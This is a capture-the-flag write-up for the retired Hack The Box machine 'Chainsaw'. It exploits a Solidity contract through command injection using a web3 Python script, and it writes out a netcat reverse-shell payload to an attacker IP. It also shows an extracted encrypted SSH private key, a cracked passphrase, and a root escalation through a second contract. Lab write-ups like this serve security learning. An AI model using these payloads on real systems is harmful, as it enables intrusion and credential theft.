**Chainsaw** is a retired vulnerable VM from Hack. This box is about Solidity, Ethereum Blockchain and IPFS Exploitation. 

#### Enumeration

To begin the enumeration process, a **TCP/UDP** port scan was run against the target using nmap. The purpose of scan is to quickly determine which ports are open and which services are running. 

###### OS Information
Based on the Apache version, it looks like we are dealing with Xenial / Ubuntu 16.04 based system.

###### Open Ports and Services :
In addition to usual ports

+ Port 21 : FTP Server which allows anonymous login
+ Port 22 : SSH Server
+ Port 9810 : A webserver ?

###### Anonymous FTP:

```python

➜  chainsaw ftp 10.10.10.142
Connected to 10.10.10.142.
220 (vsFTPd 3.0.3)
Name (10.10.10.142:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
-rw-r--r--    1 1001     1001           44 May 31 16:20 address.txt
226 Directory send OK.
ftp> mget *
```
We have got three interesting files from FTP server, after a bit of researching i found out these files are belong to a etherum smart contract.

#### What is a Smart Contract ?

> A smart contract is an agreement between two people in the form of computer code. They run on the blockchain, so they are stored on a public database and cannot be changed.

#### Analyzing Smart Contract

+ WeaponizedPing.json - A compiled Solidity smart-contract in JSON format
+ WeaponizedPing.sol - .sol extention, Ethereum smart-sontract written in Solidity
+ address.txt - Address on a blockchain where the contract is been deployed.


Lets take a look at the solidity code:

**WeaponizedPing.sol**

```python
pragma solidity ^0.4.24;

contract WeaponizedPing
{
  string store = "google.com";

  function getDomain() public view returns (string)
  {
      return store;
  }

  function setDomain(string _value) public
  {
      store = _value;
  }
}
```

+ Smart contracts is written in Solidity, which is a contract-oriented, high-level language for implementing smart contracts.
+ A getDomain function and setDomain which accepts a string_value. 
+ The getDomain function  retrieves the current value of the domain string
+ setDomain set a value for the domain string

##### Initial Foothold:

After some enumeration and reading about etherum blockchain i was able to determine the service running in tcp port 9810 was Ganache CLI.

> Ganache (formally known as testrpc) is an Ethereum implementation written in Node.js meant for testing purposes while developing dapps locally.

Ganache CLI uses ethereumjs to simulate full client behavior and make developing Ethereum applications faster, easier, and safer. It also includes all popular RPC functions and features (like events) and can be run deterministically to make development a breez.

To interact with the Smart Contract, we need:

+ the address to identify the contract
+ Application Binary Interface of the contract (abi)

To test this vulnerability we can use setDomain() function and set the domain to our localhost  and then call getDomain(). This will make the contract ping localhost, if ping successful we know we got remote code execution.

###### Building Python Script
To test our theory let’s start building a python script to interact with this contract. I will be using web3 liabrary to interect with smart contract.

My final exploit is shown below:

```python
#!/usr/bin/env python3
import json, sys
from web3 import Web3, HTTPProvider

abi = json.loads(open('WeaponizedPing.json').read())
address = open('address.txt').read().rstrip()
w3 = Web3(HTTPProvider('http://10.10.10.142:9810'))
account = w3.eth.coinbase
contract = w3.eth.contract(address=address, abi=abi['abi'])
contract.functions.setDomain(sys.argv[1]).transact({"from":account,"to":address})
contract.functions.getDomain().call()
```

#### Initial Shell

Before trying to get a remote shell lets test our theory and find if we can achive RCE. Our script will send a ping request to our VPN IP.

TCP Dump to capture ping request:

```python

➜  chainsaw tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
```
Yes we recived ICMP echo requests from our IP. Now that we know RCE possible, lets replace the ping with our payload.

Running the exploit:

> python3 chainsaw.py '; nc 10.10.14.35 4444 -e /bin/bash'

Waiting for reverse shell:

```python

➜  chainsaw nc -lvnp 4444                                           
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.142] 40676
id
uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)
python -c 'import pty; pty.spawn("/bin/bash")'
administrator@chainsaw:/opt/WeaponizedPing$ 

```
Before doing anything i upgraded my shell. After that i quickly searched for the user.txt but it is not here, so back to further enumeration. 

###### System Enumeration :

Checked to see if their is anyother users in the system, i can see user bobby which we might have to escalate to. 

```python

administrator@chainsaw:/home$ awk -F: '$3 >= 1000 {print}' /etc/passwd
awk -F: '$3 >= 1000 {print}' /etc/passwd
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
bobby:x:1000:1000:Bobby Axelrod:/home/bobby:/bin/bash
administrator:x:1001:1001:Chuck Rhoades,,,,IT Administrator:/home/administrator:/bin/bash
administrator@chainsaw:/home$ 
```

Interesting files in maintain folder:


```python

administrator@chainsaw:~/maintain$ cd pub && ls -al
total 28
drwxrwxr-x 2 administrator administrator 4096 Dec 13  2018 .
drwxr-x--- 3 administrator administrator 4096 Dec 13  2018 ..
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 arti.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bobby.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bryan.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 lara.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 wendy.key.pub
```

In pub folder we can see public key of bobby:


```python

administrator@chainsaw:/home/administrator/maintain$ cat gen.py 
#!/usr/bin/python
from Crypto.PublicKey import RSA
from os import chmod
import getpass

def generate(username,password):
        key = RSA.generate(2048)
        pubkey = key.publickey()

        pub = pubkey.exportKey('OpenSSH')
        priv = key.exportKey('PEM',password,pkcs=1)

        filename = "{}.key".format(username)

        with open(filename, 'w') as file:
                chmod(filename, 0600)
                file.write(priv)
                file.close()

        with open("{}.pub".format(filename), 'w') as file:
                file.write(pub)
                file.close()

        # TODO: Distribute keys via ProtonMail

if __name__ == "__main__":
        while True:
                username = raw_input("User: ")
                password = getpass.getpass()
                generate(username,password)
```

This script generate the RSA keys and sent it via proton mail. Lets look for these keys, we might find the keys stored in somewhere.This comment "distributing keys over Protonmail" is a interesting one. T


###### InterPlanetary File System

There is a .ipfs folder in administrator’s homedirectory.

> The InterPlanetary File System is a protocol and peer-to-peer network for storing and sharing data in a distributed file system. IPFS uses content-addressing to uniquely identify each file in a global namespace connecting all computing devices.

```python

administrator@chainsaw:/home/administrator$ ls -la
ls -la
total 104
drwxr-x--- 8 administrator administrator  4096 Dec 20  2018 .
drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -> /dev/null
-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout
-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc
-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv
drwxrwxr-x 5 administrator administrator  4096 Jan 23  2019 .ipfs
drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local
drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2
-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt
-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf
-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -> /dev/null
-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc
administrator@chainsaw:/home/administrator$ 

```
Content of IPFS folder:

```python

administrator@chainsaw:/home/administrator/.ipfs$ ls -la
ls -la
total 36
drwxrwxr-x  5 administrator administrator 4096 Jun  9 18:38 .
drwxr-x---  8 administrator administrator 4096 Dec 20  2018 ..
drwxr-xr-x 41 administrator administrator 4096 Jun  9 18:38 blocks
-rw-rw----  1 administrator administrator 5273 Dec 13  2018 config
drwxr-xr-x  2 administrator administrator 4096 Jun  9 18:38 datastore
-rw-------  1 administrator administrator  190 Dec 13  2018 datastore_spec
drwx------  2 administrator administrator 4096 Dec 13  2018 keystore
-rw-r--r--  1 administrator administrator    0 Jun  9 18:38 repo.lock
-rw-r--r--  1 administrator administrator    2 Dec 13  2018 version
administrator@chainsaw:/home/administrator/.ipfs$ 
```
There are a lot of files in the folder, so to filtter out unrelated stuff i searched for files containing bobby inside ipfs folder using **grep -iRl bobby** and found few IPFS blocks which contains bobby's data. **In IPFS, a block refers to a single unit of data, identified by its key (hash)**

```python


administrator@chainsaw:/home/administrator/.ipfs$ grep -iRl bobby
grep -iRl bobby
blocks/SG/CIQBGBBWXJ4N54A5BUNC7WYVUQNXLEQN67SNFTAPGUMYTYB2UAC4SGI.data
blocks/JL/CIQKWHQP7PFXWUXO6CSIFQMFWW4CTR23WJEFINRLPRC6UAP2ZM5EJLY.data
blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data
blocks/SP/CIQJWFQFWYW5QEXAELBZ5WBEDCJBZ2RSPCHVGDOXQ6FM67VBWKVTSPI.data
administrator@chainsaw:/home/administrator/.ipfs$ 
```
Got few files that might contain the data. lets check:

```python

administrator@chainsaw:/home/administrator/.ipfs$ cat blocks/OY/CIQG3CRQFZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data
<ZCTNW7GKEFLYX5KSQD4SZUO2SMZHX6ZPT57JIR6WSNTOYQ.data

��$X-Pm-Origin: internal
X-Pm-Content-Encryption: end-to-end
Subject: Ubuntu Server Private RSA Key
From: IT Department <chainsaw_admin@protonmail.ch>
Date: Thu, 13 Dec 2018 19:28:54 +0000
Mime-Version: 1.0
Content-Type: multipart/mixed;boundary=---------------------d296272d7cb599bff2a1ddf6d6374d93
To: bobbyaxelrod600@protonmail.ch <bobbyaxelrod600@protonmail.ch>
X-Attached: bobby.key.enc
Message-Id: <zctvLwVo5mWy8NaBt3CLKmxVckb-cX7OCfxUYfHsU2af1NH4krcpgGz7h-PorsytjrT3sA9Ju8WNuWaRAnbE0CY0nIk2WmuwOvOnmRhHPoU=@protonmail.ch>
Received: from mail.protonmail.ch by mail.protonmail.ch; Thu, 13 Dec 2018 14:28:58 -0500
X-Original-To: bobbyaxelrod600@protonmail.ch
Return-Path: <chainsaw_admin@protonmail.ch>
Delivered-To: bobbyaxelrod600@protonmail.ch

-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: multipart/related;boundary=---------------------ffced83f318ffbd54e80374f045d2451

-----------------------ffced83f318ffbd54e80374f045d2451
Content-Type: text/html;charset=utf-8
Content-Transfer-Encoding: base64

PGRpdj5Cb2JieSw8YnI+PC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj5JIGFtIHdyaXRpbmcgdGhp
cyBlbWFpbCBpbiByZWZlcmVuY2UgdG8gdGhlIG1ldGhvZCBvbiBob3cgd2UgYWNjZXNzIG91ciBM
aW51eCBzZXJ2ZXIgZnJvbSBub3cgb24uIER1ZSB0byBzZWN1cml0eSByZWFzb25zLCB3ZSBoYXZl
IGRpc2FibGVkIFNTSCBwYXNzd29yZCBhdXRoZW50aWNhdGlvbiBhbmQgaW5zdGVhZCB3ZSB3aWxs
IHVzZSBwcml2YXRlL3B1YmxpYyBrZXkgcGFpcnMgdG8gc2VjdXJlbHkgYW5kIGNvbnZlbmllbnRs
eSBhY2Nlc3MgdGhlIG1hY2hpbmUuPGJyPjwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+QXR0YWNo
ZWQgeW91IHdpbGwgZmluZCB5b3VyIHBlcnNvbmFsIGVuY3J5cHRlZCBwcml2YXRlIGtleS4gUGxl
YXNlIGFzayZuYnNwO3JlY2VwdGlvbiBkZXNrIGZvciB5b3VyIHBhc3N3b3JkLCB0aGVyZWZvcmUg
YmUgc3VyZSB0byBicmluZyB5b3VyIHZhbGlkIElEIGFzIGFsd2F5cy48YnI+PC9kaXY+PGRpdj48
YnI+PC9kaXY+PGRpdj5TaW5jZXJlbHksPGJyPjwvZGl2PjxkaXY+SVQgQWRtaW5pc3RyYXRpb24g
RGVwYXJ0bWVudDxicj48L2Rpdj4=
```

Baseg4 decoded Mail body: 

```python


I am writing this email in reference to the method on how we access our Linux server from now on. Due to security reasons, we have disabled SSH password authentication and instead we will use private/public key pairs to securely and conveniently access the machine.<br></div><div><br></div><div>Attached you will find your personal encrypted private key. Please ask&nbsp;reception desk for your password, therefore be sure to bring your valid ID as always.
IT Administration Department
```
The mail attachment contains SSH keypair bobby.

Base64 decoded SSH keypair key:

```python

-----------------------ffced83f318ffbd54e80374f045d2451--
-----------------------d296272d7cb599bff2a1ddf6d6374d93
Content-Type: application/octet-stream; filename="bobby.key.enc"; name="bobby.key.enc"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="bobby.key.enc"; name="bobby.key.enc"

LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
Sy1JbmZvOiBERVMtRURFMy1DQkMsNTNEODgxRjI5OUJBODUwMwoKU2VDTll3L0JzWFB5UXExSFJM
RUVLaGlOSVZmdFphZ3pPY2M2NGZmMUlwSm85SWVHN1ovemordjFkQ0lkZWp1awo3a3RRRmN6VGx0
dG5ySWo2bWRCYjZybk42Q3NQMHZiejlOelJCeWcxbzZjU0dkckwyRW1KTi9lU3hENEFXTGN6Cm4z
MkZQWTBWamxJVnJoNHJqaFJlMndQTm9nQWNpQ0htWkdFQjB0Z3YyL2V5eEU2M1ZjUnpyeEpDWWwr
aHZTWjYKZnZzU1g4QTRRcjdyYmY5Zm56NFBJbUlndXJGM1ZoUW1kbEVtekRSVDRtL3BxZjNUbUdB
azkrd3JpcW5rT0RGUQpJKzJJMWNQYjhKUmhMU3ozcHlCM1gvdUdPVG5ZcDRhRXErQVFaMnZFSnoz
RmZYOVNYOWs3ZGQ2S2FadFNBenFpCnc5ODFFUzg1RGs5TlVvOHVMeG5aQXczc0Y3UHo0RXVKMEhw
bzFlWmdZdEt6dkRLcnJ3OHVvNFJDYWR4N0tIUlQKaW5LWGR1SHpuR0ExUVJPelpXN3hFM0hFTDN2
eFI5Z01WOGdKUkhEWkRNSTl4bHc5OVFWd2N4UGNGYTMxQXpWMgp5cDNxN3lsOTU0U0NNT3RpNFJD
M1o0eVVUakRrSGRIUW9FY0dpZUZPV1UraTFvaWo0Y3J4MUxiTzJMdDhuSEs2CkcxQ2NxN2lPb240
UnNUUmxWcnY4bGlJR3J4bmhPWTI5NWU5ZHJsN0JYUHBKcmJ3c284eHhIbFQzMzMzWVU5ZGoKaFFM
TnA1KzJINCtpNm1tVTN0Mm9nVG9QNHNrVmNvcURsQ0MrajZoRE9sNGJwRDl0NlRJSnVyV3htcEdn
TnhlcwpxOE5zQWVudGJzRCt4bDRXNnE1bXVMSlFtai94UXJySGFjRVpER0k4a1d2WkUxaUZtVmtE
L3hCUm53b0daNWh0CkR5aWxMUHBsOVIrRGg3YnkzbFBtOGtmOHRRbkhzcXBSSGNleUJGRnBucTBB
VWRFS2ttMUxSTUxBUFlJTGJsS0cKandyQ3FSdkJLUk1JbDZ0SmlEODdOTTZKQm9ReWRPRWNwbis2
RFUrMkFjdGVqYnVyMGFNNzRJeWVlbnJHS1NTWgpJWk1zZDJrVFNHVXh5OW8veFBLRGtVdy9TRlV5
U21td2lxaUZMNlBhRGd4V1F3SHh0eHZtSE1oTDZjaXROZEl3ClRjT1RTSmN6bVIycEp4a29oTHJI
N1lyUzJhbEtzTTBGcEZ3bWR6MS9YRFNGMkQ3aWJmL1cxbUF4TDVVbUVxTzAKaFVJdVcxZFJGd0hq
TnZhb1NrK2ZyQXA2aWM2SVBZU21kbzhHWVl5OHBYdmNxd2ZScHhZbEFDWnU0RmlpNmhZaQo0V3Bo
VDNaRllEcnc3U3RnSzA0a2JEN1FrUGVOcTlFdjFJbjJuVmR6RkhQSWg2eitmbXBiZ2ZXZ2VsTEhj
MmV0ClNKWTQrNUNFYmtBY1lFVW5QV1k5U1BPSjdxZVU3K2IvZXF6aEtia3BuYmxtaUsxZjNyZU9N
MllVS3k4YWFsZWgKbkpZbWttcjN0M3FHUnpoQUVUY2tjOEhMRTExZEdFK2w0YmE2V0JOdTE1R29F
V0Fzenp0TXVJVjFlbW50OTdvTQpJbW5mb250T1lkd0I2LzJvQ3V5SlRpZjhWdy9XdFdxWk5icGV5
OTcwNGE5bWFwLytiRHFlUVE0MStCOEFDRGJLCldvdnNneVdpL1VwaU1UNm02clgrRlA1RDVFOHpy
WXRubm1xSW83dnhIcXRCV1V4amFoQ2RuQnJrWUZ6bDZLV1IKZ0Z6eDNlVGF0bFpXeXI0a3N2Rm10
b2JZa1pWQVFQQUJXeitnSHB1S2xycWhDOUFOenIvSm4rNVpmRzAybW9GLwplZEwxYnA5SFBSSTQ3
RHl2THd6VDEvNUw5Wno2WSsxTXplbmRUaTNLcnpRL1ljZnI1WUFSdll5TUxiTGpNRXRQClV2SmlZ
NDB1Mm5tVmI2UXFwaXkyenIvYU1saHB1cFpQay94dDhvS2hLQytsOW1nT1RzQVhZakNiVG1MWHpW
clgKMTVVMjEwQmR4RUZVRGNpeE5pd1Rwb0JTNk1meENPWndOLzFadjBtRThFQ0krNDRMY3FWdDN3
PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0=
-----------------------d296272d7cb599bff2a1ddf6d6374d93--
```

#### Cracking Password

The file is encrypted with  triple DES with CBC mode. To decrypt the key we need to use ssh2john and convert the encrypted RSA Private Key into a hash format and feed it to JTR.

```python

➜  chainsaw python ssh2john.py bobby.key.enc.b64 > bobby_hash                     

```
After few seconds the key is cracked and password is **jackychain**

```python

➜  chainsaw john --wordlist=/usr/share/wordlists/rockyou.txt  bobby_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
jackychain       (bobby.key.enc.b64)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:16 DONE (2020-06-10 05:11) 0.05938g/s 851644p/s 851644c/s 851644C/sa6_123..*7¡Vamos!
Session completed
```

#### Getting user.txt

Now I can connect as bobby and grab user.txt 
```python

➜  chainsaw ssh -i bobby.key.enc.b64 bobby@10.10.10.142
Enter passphrase for key 'bobby.key.enc.b64': 
bobby@chainsaw:~$ id
uid=1000(bobby) gid=1000(bobby) groups=1000(bobby),30(dip)
bobby@chainsaw:~$ wc -l user.txt 
1 user.txt

```

#### Priviledge Escalation

During the enumeration for root i noticed few interesting files in bobbys home. In addition to user.txt, there are two folders in bobby’s homedirectory:

```python

bobby@chainsaw:~$ ls
projects  resources  user.txt
bobby@chainsaw:~$ 
```
Resources folder contains documentation related to IPFS:

```python

bobby@chainsaw:~/resources$ ls
InterPlanetary_File_System.pdf  IPFS-Draft.pdf  IPFS-Presentation.pdf

```
Project folder contains few files related smart contract and a SUID binary:

```python
bobby@chainsaw:~/projects$ ls -la
total 12
drwxrwxr-x 3 bobby bobby 4096 Dec 20  2018 .
drwxr-x--- 9 bobby bobby 4096 Jan 23  2019 ..
drwxrwxr-x 2 bobby bobby 4096 Jan 23  2019 ChainsawClub
```
##### ChainsawClub: Analysis

Here we have got another smart contract, Looks like we’re going to be doing some more smart contract exploitation.

Chainsaw SUID binary:

```python

bobby@chainsaw:~/projects/ChainsawClub$ ./ChainsawClub 

      _           _
     | |         (_)
  ___| |__   __ _ _ _ __  ___  __ ___      __
 / __| '_ \ / _` | | '_ \/ __|/ _` \ \ /\ / /
| (__| | | | (_| | | | | \__ \ (_| |\ V  V /
 \___|_| |_|\__,_|_|_| |_|___/\__,_| \_/\_/
                                            club
                                                                                                                                                                      
- Total supply: 1000                                                                                                                                                  
- 1 CHC = 51.08 EUR                                                                                                                                                   
- Market cap: 51080 (€)                                                                                                                                               
                                                                                                                                                                      
[*] Please sign up first and then log in!                                                                                                                             
[*] Entry based on merit.

Username: test
Password: 
[*] Wrong credentials!

```
Running the binary prompt for a username and password which we don't have. Lets check the chainsawclub.sol file.


ChainsawClub.sol:

```python

bobby@chainsaw:~/projects/ChainsawClub$ cat ChainsawClub.sol
pragma solidity ^0.4.22;

contract ChainsawClub {

  string username = 'nobody';
  string password = '7b455ca1ffcb9f3828cfdde4a396139e';
  bool approve = false;
  uint totalSupply = 1000;
  uint userBalance = 0;

  function getUsername() public view returns (string) {
      return username;
  }
  function setUsername(string _value) public {
      username = _value;
  }
  function getPassword() public view returns (string) {
      return password;
  }
  function setPassword(string _value) public {
      password = _value;
  }
  function getApprove() public view returns (bool) {
      return approve;
  }
  function setApprove(bool _value) public {
      approve = _value;
  }
  function getSupply() public view returns (uint) {
      return totalSupply;
  }
  function getBalance() public view returns (uint) {
      return userBalance;
  }
  function transfer(uint _value) public {
      if (_value > 0 && _value <= totalSupply) {
          totalSupply -= _value;
          userBalance += _value;
      }
  }
  function reset() public {
      username = '';
      password = '';
      userBalance = 0;
      totalSupply = 1000;
      approve = false;
  }
}
```
Interesting functions available in the solidity file:

+ **setUsername() and setPassword() 
+ **setApprove()
+ **getSupply() 
+ **transfer() 
+ **reset() 

#### PrivEscalation Exploit:

Just like before we’ll write a python script to interact with the contract.

Ganache-cli running locally on port 63991 

```python

bobby@chainsaw:~/projects/ChainsawClub$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9810            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:63991         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
bobby@chainsaw:~/projects/ChainsawClub$ 


```
So we need to portforward,that way we can access it locally.

```python

➜  chainsaw ssh -i bobby.key.enc.b64 -L 63991:127.0.0.1:63991 bobby@10.10.10.142
Enter passphrase for key 'bobby.key.enc.b64': 
bobby@chainsaw:~$ 
```
#### Exploitation

To make our exploit work we need to meet certain conditions:

+ Set a new username and password.
+ Match the credentials from the smart contract
+ Approve our user 
+ Transfer enough  funds to join  the club 


Full Exploit


##### Root Shell

```python

Username: d3
Password: 

         ************************
         * Welcome to the club! *
         ************************

 Rule #1: Do not get excited too fast.
    
root@chainsaw:/home/bobby/projects/ChainsawClub# id
uid=0(root) gid=0(root) groups=0(root)
root@chainsaw:/home/bobby/projects/ChainsawClub# 
root@chainsaw:/home# locate root.txt
\/root/root.txt
root@chainsaw:/home# cat /root/root.txt
Mine deeper to get rewarded with root coin (RTC)...
root@chainsaw:/home# 
```

Look like we have to dig deeper to find the root.tx file. After hours of enumeration i coudn't find anything and had to ask for a hint. 

##### Slack Space

Based on the hint i found a **bmap** folder in **/sbin** directory.
> bmap is a tool for creating the block map for a file or copying files using the block map,

root@chainsaw:~# bmap --slack root.txt
getting from block 2655304
file size was: 52
slack size: 4044
block size: 4096
68c874b7d*******

There is another way we can exploit this SUID binary, but i will leave it  from here.

#### Concluion
This was a great box, i learned a lot about smartcontacts,blockchain,IPFS and slack spacing.

